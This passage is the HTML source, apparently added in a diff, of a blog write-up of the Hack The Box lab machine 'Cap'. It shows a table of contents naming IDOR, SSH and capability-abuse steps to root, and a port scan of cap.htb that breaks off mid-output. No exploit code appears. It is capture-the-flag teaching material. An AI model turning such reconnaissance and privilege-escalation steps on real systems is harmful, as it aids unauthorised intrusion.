0.21c0.026 0.083 0.044 0.172 0.053 0.269a2.639 2.639 0 0 1 0 0.532 1.28 1.28 0 0 1 -0.053 0.27 0.585 0.585 0 0 1 -0.114 0.21 0.244 0.244 0 0 1 -0.193 0.085 0.25 0.25 0 0 1 -0.196 -0.085 0.589 0.589 0 0 1 -0.117 -0.21 1.245 1.245 0 0 1 -0.056 -0.27 2.597 2.597 0 0 1 0 -0.532c0.01 -0.097 0.028 -0.186 0.056 -0.27a0.589 0.589 0 0 1 0.117 -0.209 0.249 0.249 0 0 1 0.196 -0.085zm-6.729 3.073a0.676 0.676 0 0 0 -0.335 0.078 0.661 0.661 0 0 0 -0.227 0.211 0.91 0.91 0 0 0 -0.127 0.31c-0.027 0.118 -0.04 0.242 -0.04 0.373s0.013 0.256 0.04 0.375a0.93 0.93 0 0 0 0.127 0.313 0.65 0.65 0 0 0 0.227 0.215c0.092 0.053 0.204 0.08 0.335 0.08a0.655 0.655 0 0 0 0.334 -0.08 0.65 0.65 0 0 0 0.225 -0.215c0.057 -0.09 0.1 -0.194 0.125 -0.313a1.75 1.75 0 0 0 0.04 -0.375c0 -0.13 -0.014 -0.255 -0.04 -0.373a0.931 0.931 0 0 0 -0.125 -0.31 0.658 0.658 0 0 0 -0.225 -0.21 0.667 0.667 0 0 0 -0.334 -0.08zm3.086 0a0.675 0.675 0 0 0 -0.336 0.078 0.661 0.661 0 0 0 -0.226 0.211 0.907 0.907 0 0 0 -0.127 0.31 1.69 1.69 0 0 0 -0.04 0.373c0 0.131 0.013 0.256 0.04 0.375a0.928 0.928 0 0 0 0.127 0.313c0.058 0.09 0.134 0.162 0.226 0.215 0.093 0.053 0.205 0.08 0.336 0.08a0.655 0.655 0 0 0 0.334 -0.08 0.65 0.65 0 0 0 0.224 -0.215c0.058 -0.09 0.1 -0.194 0.126 -0.313a1.752 1.752 0 0 0 0 -0.748 0.94 0.94 0 0 0 -0.126 -0.31 0.657 0.657 0 0 0 -0.224 -0.21 0.667 0.667 0 0 0 -0.334 -0.08zm5.108 0a0.675 0.675 0 0 0 -0.336 0.078 0.661 0.661 0 0 0 -0.226 0.211 0.91 0.91 0 0 0 -0.127 0.31c-0.027 0.118 -0.04 0.242 -0.04 0.373s0.013 0.256 0.04 0.375a0.931 0.931 0 0 0 0.127 0.313c0.058 0.09 0.134 0.162 0.226 0.215 0.093 0.053 0.205 0.08 0.336 0.08 0.13 0 0.243 -0.027 0.334 -0.08a0.65 0.65 0 0 0 0.224 -0.215c0.058 -0.09 0.1 -0.194 0.126 -0.313a1.75 1.75 0 0 0 0.04 -0.375c0 -0.13 -0.014 -0.255 -0.04 -0.373a0.943 0.943 0 0 0 -0.126 -0.31 0.657 0.657 0 0 0 -0.224 -0.21 0.668 0.668 0 0 0 -0.334 -0.08zm-6.658 0.05 -0.61 0.448 0.227 0.311 0.346 -0.266v1.362h0.438v-1.856zm3.068 0 -0.61 0.448 0.227 0.311 0.346 -0.266v1.362h0.438v-1.856zm5.108 0 -0.611 0.448 0.228 0.311 0.346 -0.266v1.362h0.438v-1.856zm-9.712 0.322c0.058 0 0.105 0.02 0.14 0.062a0.421 0.421 0 0 1 0.083 0.151 0.96 0.96 0 0 1 0.04 0.196 1.932 1.932 0 0 1 0 0.386 0.954 0.954 0 0 1 -0.04 0.197 0.421 0.421 0 0 1 -0.083 0.152 0.176 0.176 0 0 1 -0.14 0.061 0.18 0.18 0 0 1 -0.141 -0.06 0.427 0.427 0 0 1 -0.085 -0.153 0.887 0.887 0 0 1 -0.041 -0.197 1.96 1.96 0 0 1 0 -0.386 0.893 0.893 0 0 1 0.04 -0.196 0.42 0.42 0 0 1 0.086 -0.151 0.181 0.181 0 0 1 0.141 -0.062zm3.086 0c0.058 0 0.104 0.02 0.14 0.062a0.421 0.421 0 0 1 0.082 0.151 0.94 0.94 0 0 1 0.04 0.196 1.906 1.906 0 0 1 0 0.386 0.93 0.93 0 0 1 -0.04 0.197 0.421 0.421 0 0 1 -0.082 0.152 0.176 0.176 0 0 1 -0.14 0.061 0.18 0.18 0 0 1 -0.141 -0.06 0.42 0.42 0 0 1 -0.086 -0.153 0.846 0.846 0 0 1 -0.04 -0.197 1.965 1.965 0 0 1 -0.011 -0.195c0 -0.057 0.004 -0.121 0.01 -0.191a0.849 0.849 0 0 1 0.041 -0.196 0.42 0.42 0 0 1 0.086 -0.151 0.182 0.182 0 0 1 0.141 -0.062zm5.108 0c0.058 0 0.104 0.02 0.14 0.062a0.421 0.421 0 0 1 0.082 0.151 0.92 0.92 0 0 1 0.04 0.196 1.963 1.963 0 0 1 0 0.386 0.943 0.943 0 0 1 -0.04 0.197 0.421 0.421 0 0 1 -0.082 0.152 0.177 0.177 0 0 1 -0.14 0.061 0.18 0.18 0 0 1 -0.142 -0.06 0.437 0.437 0 0 1 -0.085 -0.153 0.95 0.95 0 0 1 -0.04 -0.197 1.965 1.965 0 0 1 -0.011 -0.195c0 -0.057 0.004 -0.121 0.01 -0.191a0.959 0.959 0 0 1 0.04 -0.196 0.47 0.47 0 0 1 0.086 -0.151 0.181 0.181 0 0 1 0.142 -0.062zm-1.684 1.814a0.675 0.675 0 0 0 -0.336 0.079 0.66 0.66 0 0 0 -0.227 0.21 0.91 0.91 0 0 0 -0.127 0.31 1.731 1.731 0 0 0 0 0.748 0.939 0.939 0 0 0 0.127 0.314c0.059 0.09 0.134 0.162 0.227 0.215 0.093 0.053 0.205 0.08 0.336 0.08a0.66 0.66 0 0 0 0.334 -0.08 0.648 0.648 0 0 0 0.224 -0.215c0.058 -0.09 0.1 -0.195 0.126 -0.314a1.737 1.737 0 0 0 -0.001 -0.747 0.928 0.928 0 0 0 -0.125 -0.31 0.65 0.65 0 0 0 -0.224 -0.211 0.668 0.668 0 0 0 -0.334 -0.079zm3.063 0a0.676 0.676 0 0 0 -0.336 0.079 0.664 0.664 0 0 0 -0.227 0.21 0.906 0.906 0 0 0 -0.127 0.31 1.74 1.74 0 0 0 0 0.748 0.936 0.936 0 0 0 0.127 0.314 0.66 0.66 0 0 0 0.227 0.215c0.092 0.053 0.204 0.08 0.336 0.08a0.654 0.654 0 0 0 0.334 -0.08 0.648 0.648 0 0 0 0.223 -0.215c0.058 -0.09 0.1 -0.195 0.126 -0.314a1.74 1.74 0 0 0 0 -0.747 0.928 0.928 0 0 0 -0.126 -0.31 0.65 0.65 0 0 0 -0.223 -0.211 0.666 0.666 0 0 0 -0.334 -0.079zm-1.545 0.05 -0.611 0.448 0.228 0.312 0.346 -0.267v1.363h0.438v-1.856zm-1.518 0.323c0.057 0 0.104 0.02 0.14 0.061a0.42 0.42 0 0 1 0.082 0.152 0.91 0.91 0 0 1 0.04 0.195 1.966 1.966 0 0 1 0 0.387 0.951 0.951 0 0 1 -0.04 0.197 0.421 0.421 0 0 1 -0.082 0.152 0.177 0.177 0 0 1 -0.14 0.06 0.18 0.18 0 0 1 -0.142 -0.06 0.428 0.428 0 0 1 -0.085 -0.152 0.914 0.914 0 0 1 -0.04 -0.197 1.96 1.96 0 0 1 -0.011 -0.195c0 -0.058 0.003 -0.122 0.01 -0.192a0.923 0.923 0 0 1 0.041 -0.195c0.02 -0.06 0.048 -0.11 0.085 -0.152a0.181 0.181 0 0 1 0.142 -0.061zm3.063 0c0.057 0 0.104 0.02 0.14 0.061a0.42 0.42 0 0 1 0.082 0.152 0.94 0.94 0 0 1 0.04 0.195 1.91 1.91 0 0 1 0 0.387 0.93 0.93 0 0 1 -0.04 0.197 0.422 0.422 0 0 1 -0.083 0.152 0.175 0.175 0 0 1 -0.14 0.06 0.18 0.18 0 0 1 -0.141 -0.06 0.423 0.423 0 0 1 -0.085 -0.152 0.907 0.907 0 0 1 -0.04 -0.197 1.95 1.95 0 0 1 0 -0.387 0.915 0.915 0 0 1 0.04 -0.195c0.02 -0.06 0.048 -0.11 0.085 -0.152a0.182 0.182 0 0 1 0.142 -0.061zm-9.713 0.185a0.465 0.465 0 0 0 -0.232 0.055 0.456 0.456 0 0 0 -0.157 0.146 0.627 0.627 0 0 0 -0.089 0.215 1.168 1.168 0 0 0 -0.027 0.259c0 0.09 0.009 0.177 0.027 0.26a0.648 0.648 0 0 0 0.089 0.216c0.04 0.063 0.093 0.112 0.157 0.149a0.459 0.459 0 0 0 0.232 0.056c0.09 0 0.168 -0.02 0.231 -0.056a0.45 0.45 0 0 0 0.156 -0.149 0.67 0.67 0 0 0 0.087 -0.217 1.218 1.218 0 0 0 0 -0.518 0.647 0.647 0 0 0 -0.087 -0.215 0.448 0.448 0 0 0 -0.156 -0.146 0.458 0.458 0 0 0 -0.23 -0.055zm1.052 0.035 -0.423 0.31 0.158 0.217 0.24 -0.185v0.944h0.303v-1.286zm-1.052 0.224c0.04 0 0.073 0.014 0.097 0.042a0.284 0.284 0 0 1 0.057 0.105 0.69 0.69 0 0 1 0.028 0.136c0.004 0.049 0.007 0.092 0.007 0.133 0 0.04 -0.003 0.086 -0.007 0.135a0.684 0.684 0 0 1 -0.028 0.136 0.285 0.285 0 0 1 -0.057 0.105 0.123 0.123 0 0 1 -0.097 0.043 0.125 0.125 0 0 1 -0.098 -0.043 0.298 0.298 0 0 1 -0.059 -0.105 0.612 0.612 0 0 1 -0.028 -0.136 1.39 1.39 0 0 1 0 -0.268 0.62 0.62 0 0 1 0.028 -0.136 0.297 0.297 0 0 1 0.06 -0.105 0.125 0.125 0 0 1 0.097 -0.042zm3.775 1.394a0.463 0.463 0 0 0 -0.232 0.054 0.452 0.452 0 0 0 -0.157 0.146 0.621 0.621 0 0 0 -0.088 0.214 1.19 1.19 0 0 0 0 0.519 0.641 0.641 0 0 0 0.088 0.217 0.46 0.46 0 0 0 0.157 0.15 0.458 0.458 0 0 0 0.232 0.054 0.454 0.454 0 0 0 0.232 -0.055 0.45 0.45 0 0 0 0.155 -0.149 0.664 0.664 0 0 0 0.087 -0.217 1.189 1.189 0 0 0 0 -0.519 0.642 0.642 0 0 0 -0.087 -0.214 0.446 0.446 0 0 0 -0.155 -0.146 0.459 0.459 0 0 0 -0.232 -0.054zm1.052 0.034 -0.423 0.31 0.158 0.216 0.24 -0.185v0.945h0.303V22.68zm-1.052 0.223c0.04 0 0.073 0.014 0.098 0.043a0.3 0.3 0 0 1 0.057 0.105 0.643 0.643 0 0 1 0.027 0.135 1.31 1.31 0 0 1 0 0.268 0.654 0.654 0 0 1 -0.027 0.137 0.307 0.307 0 0 1 -0.057 0.105 0.124 0.124 0 0 1 -0.098 0.042 0.125 0.125 0 0 1 -0.098 -0.042 0.293 0.293 0 0 1 -0.059 -0.105 0.618 0.618 0 0 1 -0.028 -0.137 1.364 1.364 0 0 1 0 -0.268 0.612 0.612 0 0 1 0.028 -0.135 0.287 0.287 0 0 1 0.06 -0.105 0.123 0.123 0 0 1 0.097 -0.043z" fill="currentColor" stroke-width="1"></path></svg>
+
+  </span>
+
+</span></a
+        >
+      
+    
+  </div>
+
+</div>
+  </div>
+</div>
+
+      
+
+      
+
+      
+      <div class="mb-5"></div>
+      
+
+    
+
+  </header>
+  
+  <section class="flex flex-col max-w-full mt-0 prose dark:prose-invert lg:flex-row">
+    
+     <div
+      class="order-first lg:ml-auto px-0 lg:order-last ltr:lg:pl-8 rtl:lg:pr-8">
+      <div class="toc ltr:pl-5 rtl:pr-5 print:hidden lg:sticky lg:top-[140px]">
+
+         <details open id="TOCView"
+  class="toc-right mt-0 overflow-y-scroll overscroll-contain scrollbar-thin scrollbar-track-neutral-200 scrollbar-thumb-neutral-400 dark:scrollbar-track-neutral-800 dark:scrollbar-thumb-neutral-600 rounded-lg ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 hidden lg:block">
+  <summary
+    class="block py-1 text-lg font-semibold cursor-pointer bg-neutral-100 text-neutral-800 ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 dark:bg-neutral-700 dark:text-neutral-100 lg:hidden">
+    Table of Contents
+  </summary>
+  <div
+    class="min-w-[220px] py-2 border-dotted ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600">
+    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#cap-linux">Cap (Linux)</a></li>
+    <li><a href="#enumeration">Enumeration</a>
+      <ul>
+        <li><a href="#nmap-scan">Nmap scan</a></li>
+      </ul>
+    </li>
+    <li><a href="#website-features">Website Features</a>
+      <ul>
+        <li><a href="#port80">Port(80)</a></li>
+        <li><a href="#directory-bruteforcing">Directory Bruteforcing</a>
+          <ul>
+            <li><a href="#idor">IDOR</a></li>
+          </ul>
+        </li>
+        <li><a href="#ssh">SSH</a></li>
+      </ul>
+    </li>
+    <li><a href="#shell-as-root">Shell as root</a>
+      <ul>
+        <li><a href="#enumeration-1">Enumeration</a></li>
+        <li><a href="#abusing-capabilities"><strong>Abusing Capabilities</strong></a></li>
+        <li><a href="#root-flag">Root Flag</a></li>
+      </ul>
+    </li>
+    <li><a href="#summary">Summary</a></li>
+  </ul>
+</nav>
+  </div>
+</details>
+<details class="toc-inside mt-0 overflow-hidden rounded-lg ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 lg:hidden">
+  <summary
+    class="py-1 text-lg font-semibold cursor-pointer bg-neutral-100 text-neutral-800 ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 dark:bg-neutral-700 dark:text-neutral-100 lg:hidden">
+    Table of Contents
+  </summary>
+  <div
+    class="py-2 border-dotted border-neutral-300 ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600">
+    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#cap-linux">Cap (Linux)</a></li>
+    <li><a href="#enumeration">Enumeration</a>
+      <ul>
+        <li><a href="#nmap-scan">Nmap scan</a></li>
+      </ul>
+    </li>
+    <li><a href="#website-features">Website Features</a>
+      <ul>
+        <li><a href="#port80">Port(80)</a></li>
+        <li><a href="#directory-bruteforcing">Directory Bruteforcing</a>
+          <ul>
+            <li><a href="#idor">IDOR</a></li>
+          </ul>
+        </li>
+        <li><a href="#ssh">SSH</a></li>
+      </ul>
+    </li>
+    <li><a href="#shell-as-root">Shell as root</a>
+      <ul>
+        <li><a href="#enumeration-1">Enumeration</a></li>
+        <li><a href="#abusing-capabilities"><strong>Abusing Capabilities</strong></a></li>
+        <li><a href="#root-flag">Root Flag</a></li>
+      </ul>
+    </li>
+    <li><a href="#summary">Summary</a></li>
+  </ul>
+</nav>
+  </div>
+</details>
+
+<script>
+
+  var margin = 200;
+  var marginError = 50;
+
+  (function () {
+    var $window = $(window);
+    var $toc = $('#TOCView');
+    var tocHeight = $toc.height();
+
+    function onResize() {
+      var windowAndMarginHeight = $window.height() - margin;
+      if(tocHeight >= windowAndMarginHeight) {
+        $toc.css("overflow-y", "scroll")
+        $toc.css("max-height", (windowAndMarginHeight + marginError) + "px")
+      } else {
+        $toc.css("overflow-y", "hidden")
+        $toc.css("max-height", "9999999px")
+      }
+    }
+
+    $window.on('resize', onResize);
+    $(document).ready(onResize);
+  })();
+
+
+
+  (function () {
+    var $toc = $('#TableOfContents');
+    if ($toc.length > 0) {
+      var $window = $(window);
+
+      function onScroll() {
+        var currentScroll = $window.scrollTop();
+        var h = $('.anchor');
+        var id = "";
+        h.each(function (i, e) {
+          e = $(e);
+          if (e.offset().top - $(window).height()/3 <= currentScroll) {
+            id = decodeURIComponent(e.attr('id'));
+          }
+        });
+        var active = $toc.find('a.active');      
+        if (active.length == 1 && active.eq(0).attr('href') == '#' + id) return true;
+
+        active.each(function (i, e) {
+          
+            $(e).removeClass('active');
+          
+        });
+        $toc.find('a[href="#' + id + '"]').addClass('active')
+        $toc.find('a[href="#' + id + '"]').parentsUntil('#TableOfContents').each(function (i, e) {
+          $(e).children('a').parents('ul').show();          
+        });
+      }
+
+      $window.on('scroll', onScroll);
+      $(document).ready(function () {
+        
+        onScroll();
+      });
+    }
+  })();
+
+
+</script>
+   </div>
+      </div>
+      
+
+      <div class="min-w-0 min-h-0 max-w-fit">
+        
+        
+
+
+        <div class="article-content max-w-prose mb-20">
+          
+
+<h1 class="relative group">Cap (Linux) 
+    <div id="cap-linux" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#cap-linux" aria-label="Anchor">#</a>
+    </span>        
+    
+</h1>
+<table>
+<thead>
+<tr>
+<th>Link:</th>
+<th><a href="https://app.hackthebox.com/machines/Cap" target="_blank">https://app.hackthebox.com/machines/Cap</a></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Difficulty</td>
+<td>Easy</td>
+</tr>
+<tr>
+<td>Machine</td>
+<td>Linux</td>
+</tr>
+</tbody>
+</table>
+
+
+<h1 class="relative group">Enumeration 
+    <div id="enumeration" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#enumeration" aria-label="Anchor">#</a>
+    </span>        
+    
+</h1>
+
+
+<h2 class="relative group">Nmap scan 
+    <div id="nmap-scan" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#nmap-scan" aria-label="Anchor">#</a>
+    </span>        
+    
+</h2>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-jsx" data-lang="jsx"><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="err">└──╼</span> <span class="nx">$sudo</span> <span class="nx">rustscan</span> <span class="o">-</span><span class="nx">a</span> <span class="nx">cap</span><span class="p">.</span><span class="nx">htb</span> <span class="o">--</span> <span class="o">-</span><span class="nx">A</span>
+</span></span><span class="line"><span class="cl"><span class="mi">21</span><span class="o">/</span><span class="nx">tcp</span> <span class="nx">open</span>  <span class="nx">ftp</span>     <span class="nx">syn</span><span class="o">-</span><span class="nx">ack</span> <span class="nx">vsftpd</span> <span class="mf">3.0.3</span>                   
+</span></span><span class="line"><span class="cl"><span class="mi">22</span><span class="o">/</span><span class="nx">tcp</span> <span class="nx">open</span>  <span class="nx">ssh</span>     <span class="nx">syn</span><span class="o">-</span><span class="nx">ack</span> <span class="nx">OpenSSH</span> <span class="mf">8.2</span><span class="nx">p1</span> <span class="nx">Ubuntu</span> <span class="mi">4</span><span class="nx">ubuntu0</span><span class="mf">.2</span> <span class="p">(</span><span class="nx">Ubuntu</span> <span class="nx">Linux</span><span class="p">;</span> <span class="nx">protocol</span> <span class="mf">2.0</span><span class="p">)</span>       
+</span></span><span class="line"><span class="cl"><span class="o">|</span> <span class="nx">ssh</span><span class="o">-</span><span class="nx">hostkey</span><span class="o">:</span> 
+</span></span><span class="line"><span class="cl"><span class="o">|</span>   <span class="mi">3072</span> <span class="nx">fa</span><span class="o">:</span><span class="mi">80</span><span class="o">:</span><span class="nx">a9</span><span class="o">:</span><span class="nx">b2</span><span class="o">:</span><span class="nx">ca</span><span class="o">:</span><span class="mi">3</span><span class="nx">b</span><span class="o">:</span><span class="mi">88</span><span class="o">:</span><span class="mi">69</span><span class="o">:</span><span class="nx">a4</span><span class="o">:</span><span class="mi">28</span><span class="o">:</span><span class="mi">9</span><span class="nx">e</span><span class="o">:</span><span class="mi">39</span><span class="o">:</span><span class="mi">0</span><span class="nx">d</span><span class="o">:</span><span class="mi">27</span><span class="o">:</span><span class="nx">d5</span><span class="o">:</span><span class="mi">75</span> <span class="p">(</span><span class="nx">RSA</span><span class="p">)</span>               
+</span></span><span class="line"><span class="cl"><span class="o">|</span> <span class="nx">ssh</span><span class="o">-</span><span class="nx">rsa</span> <span class="nx">AAAAB3NzaC1yc2EAAAADAQABAAABgQC2vrva1a</span><span class="o">+</span><span class="nx">HtV5SnbxxtZSs</span><span class="o">+</span><span class="nx">D8</span><span class="o">/</span><span class="nx">EXPL2wiqOUG2ngq9zaPlF6cuLX3P2QYvGfh5bcAIVjIqNUmmc1eSHVxtbmNEQjyJdjZOP4i2IfX</span><span class="o">/</span><span class="nx">RZUA18dWTfEWlNaoVDGBsc8zunvFk3nkyaynnXmlH7n3BLb1nRNyxtouW</span><span class="o">+</span><span class="nx">q7VzhA6YK3ziOD6tXT7MMnDU7CfG1PfMqdU297OVP35BODg1gZawthjxMi5i5R1g3nyODudFoWaHu9GZ3D</span><span class="o">/</span><span class="nx">dSQbMAxsly98L1Wr6YJ6M6xfqDurgOAl9i6TZ4zx93c</span><span class="o">/</span><span class="nx">h1MO</span><span class="o">+</span><span class="nx">mKH7EobPR</span><span class="o">/</span><span class="nx">ZWrFGLeVFZbB6jYEflCty8W8Dwr7HOdF1gULr</span><span class="o">+</span><span class="nx">Mj</span><span class="o">+</span><span class="nx">BcykLlzPoEhD7YqjRBm8SHdicPP1huq</span><span class="o">+</span><span class="err">/3tN7Q/IOf68NNJDdeq6QuGKh1CKqloT/+QZzZcJRubxULUg8YLGsYUHd1umySv4cHHEXRl7vcZJst78eBqnYUtN3MweQr4ga1kQP4YZK5qUQCTPPmrKMa9NPh1sjHSdS8IwiH12V0=                </span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span>   <span class="mi">256</span> <span class="mi">96</span><span class="o">:</span><span class="nx">d8</span><span class="o">:</span><span class="nx">f8</span><span class="o">:</span><span class="nx">e3</span><span class="o">:</span><span class="nx">e8</span><span class="o">:</span><span class="nx">f7</span><span class="o">:</span><span class="mi">71</span><span class="o">:</span><span class="mi">36</span><span class="o">:</span><span class="nx">c5</span><span class="o">:</span><span class="mi">49</span><span class="o">:</span><span class="nx">d5</span><span class="o">:</span><span class="mi">9</span><span class="nx">d</span><span class="o">:</span><span class="nx">b6</span><span class="o">:</span><span class="nx">a4</span><span class="o">:</span><span class="nx">c9</span><span class="o">:</span><span class="mi">0</span><span class="nx">c</span> <span class="p">(</span><span class="nx">ECDSA</span><span class="p">)</span>      
+</span></span><span class="line"><span class="cl"><span class="o">|</span> <span class="nx">ecdsa</span><span class="o">-</span><span class="nx">sha2</span><span class="o">-</span><span class="nx">nistp256</span> <span class="nx">AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBDqG</span><span class="o">/</span><span class="nx">RCH23t5Pr9sw6dCqvySMHEjxwCfMzBDypoNIMIa8iKYAe84s</span><span class="o">/</span><span class="nx">X7vDbA9T</span><span class="o">/</span><span class="nx">vtGDYzS</span><span class="o">+</span><span class="nx">fw8I5MAGpX8deeKI</span><span class="o">=</span> 
+</span></span><span class="line"><span class="cl"><span class="o">|</span>   <span class="mi">256</span> <span class="mi">3</span><span class="nx">f</span><span class="o">:</span><span class="nx">d0</span><span class="o">:</span><span class="nx">ff</span><span class="o">:</span><span class="mi">91</span><span class="o">:</span><span class="nx">eb</span><span class="o">:</span><span class="mi">3</span><span class="nx">b</span><span class="o">:</span><span class="nx">f6</span><span class="o">:</span><span class="nx">e1</span><span class="o">:</span><span class="mi">9</span><span class="nx">f</span><span class="o">:</span><span class="mi">2</span><span class="nx">e</span><span class="o">:</span><span class="mi">8</span><span class="nx">d</span><span class="o">:</span> <span class="nx">de</span> <span class="o">:</span><span class="nx">b3</span><span class="o">:</span><span class="nx">de</span><span class="o">:</span><span class="nx">b2</span><span class="o">:</span><span class="mi">18</span> <span class="p">(</span><span class="nx">ED25519</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span><span class="nx">_ssh</span><span class="o">-</span><span class="nx">ed25519</span> <span class="nx">AAAAC3NzaC1lZDI1NTE5AAAAIPbLTiQl</span><span class="o">+</span><span class="mi">6</span><span class="nx">W0EOi8vS</span><span class="o">+</span><span class="nx">sByUiZdBsuz0v</span><span class="o">/</span><span class="mi">7</span><span class="nx">zITtSuaTFH</span> 
+</span></span><span class="line"><span class="cl"><span class="mi">80</span><span class="o">/</span><span class="nx">tcp</span> <span class="nx">open</span>  <span class="nx">http</span>    <span class="nx">syn</span><span class="o">-</span><span class="nx">ack</span> <span class="nx">gunicorn</span>            
+</span></span><span class="line"><span class="cl"><span class="o">|</span> <span class="nx">http</span><span class="o">-</span><span class="nx">methods</span><span class="o">:</span>    
+</span></span><span class="line"><span class="cl"><span class="o">|</span><span class="nx">_</span>  <span class="nx">Supported</span> <span class="nx">Methods</span><span class="o">:</span> <span class="nx">OPTIONS</span> <span class="nx">GET</span> <span class="nx">HEAD</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span><span class="nx">_http</span><span class="o">-</span><span class="nx">server</span><span class="o">-</span><span class="nx">header</span><span class="o">:</span> <span class="nx">gunicorn</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span><span class="nx">_http</span><span class="o">-</span><span class="nx">title</span><span class="o">:</span> <span class="nx">Security</span> <span class="nx">Dashboard</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span> <span class="nx">fingerprint</span><span class="o">-</span><span class="nx">strings</span><span class="o">:</span> 
+</span></span><span class="line"><span class="cl"><span class="o">|</span>   <span class="nx">FourOhFourRequest</span><span class="o">:</span> 
+</span></span><span class="line"><span class="cl"><span class="o">|</span>     <span class="nx">HTTP</span><span class="o">/</span><span class="mf">1.0</span> <span class="mi">404</span> <span class="nx">NOT</span> <span class="nx">FOUND</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span>     <span class="nx">Server</span><span class="o">:</span> <span class="nx">gunicorn</span>                         
+</span></span><span class="line"><span class="cl"><span class="o">|</span>     <span class="nb">Date</span><span class="o">:</span> <span class="nx">Wed</span><span class="p">,</span> <span class="mi">26</span> <span class="nx">Feb</span> <span class="mi">2025</span> <span class="mi">07</span><span class="o">:</span><span class="mi">42</span><span class="o">:</span><span class="mi">36</span> <span class="nx">GMT</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span>     <span class="nx">Connection</span><span class="o">:</span> <span class="nx">close</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span>     <span class="nx">Content</span><span class="o">-</span><span class="nx">Type</span><span class="o">:</span> <span class="nx">text</span><span class="o">/</span><span class="nx">html</span><span class="p">;</span> <span class="nx">charset</span><span class="o">=</span><span class="nx">utf</span><span class="o">-</span><span class="mi">8</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span>     <span class="nx">Content</span><span class="o">-</span><span class="nx">Length</span><span class="o">:</span> <span class="mi">232</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span>     <span class="o">&lt;!</span><span class="nx">DOCTYPE</span> <span class="nx">HTML</span> <span class="nx">PUBLIC</span> <span class="s2">&#34;-//W3C//DTD HTML 3.2 Final//EN&#34;</span><span class="o">&gt;</span>                    
+</span></span><span class="line"><span class="cl"><span class="o">|</span>     <span class="p">&lt;</span><span class="nt">title</span><span class="p">&gt;</span><span class="mi">404</span> <span class="nx">Not</span> <span class="nx">Found</span><span class="p">&lt;/</span><span class="nt">title</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span>     <span class="p">&lt;</span><span class="nt">h1</span><span class="p">&gt;</span><span class="nx">Not</span> <span class="nx">Found</span><span class="p">&lt;/</span><span class="nt">h1</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span>     <span class="p">&lt;</span><span class="nt">p</span><span class="p">&gt;</span><span class="nx">The</span> <span class="nx">requested</span> <span class="nx">URL</span> <span class="nx">was</span> <span class="nx">not</span> <span class="nx">found</span> <span class="nx">on</span> <span class="nx">the</span> <span class="nx">server</span><span class="p">.</span> <span class="nx">If</span> <span class="nx">you</span> <span class="nx">entered</span> <span class="nx">the</span> <span class="nx">URL</span> <span class="nx">manually</span> <span class="nx">please</span> <span class="nx">check</span> <span class="nx">your</span> <span class="nx">spelling</span> <span class="nx">and</span> <span class="k">try</span> <span class="nx">again</span><span class="p">.&lt;/</span><span class="nt">p</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span>   <span class="nx">GetRequest</span><span class="o">:</span>                                
+</span></span><span class="line"><span class="cl"><span class="o">|</span>     <span class="nx">HTTP</span><span class="o">/</span><span class="mf">1.0</span> <span class="mi">200</span> <span class="nx">OK</span>                          
+</span></span><span class="line"><span class="cl"><span class="o">|</span>     <span class="nx">Server</span><span class="o">:</span> <span class="nx">gunicorn</span>                         
+</span></span><span class="line"><span class="cl"><span class="o">|</span>     <span class="nb">Date</span><span class="o">:</span> <span class="nx">Wed</span><span class="p">,</span> <span class="mi">26</span> <span class="nx">Feb</span> <span class="mi">2025</span> <span class="mi">07</span><span class="o">:</span><span class="mi">42</span><span class="o">:</span><span class="mi">28</span> <span class="nx">GMT</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span>     <span class="nx">Connection</span><span class="o">:</span> <span class="nx">close</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span>     <span class="nx">Content</span><span class="o">-</span><span class="nx">Type</span><span class="o">:</span> <span class="nx">text</span><span class="o">/</span><span class="nx">html</span><span class="p">;</span> <span class="nx">charset</span><span class="o">=</span><span class="nx">utf</span><span class="o">-</span><span class="mi">8</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span>     <span class="nx">Content</span><span class="o">-</span><span class="nx">Length</span><span class="o">:</span> <span class="mi">19386</span>
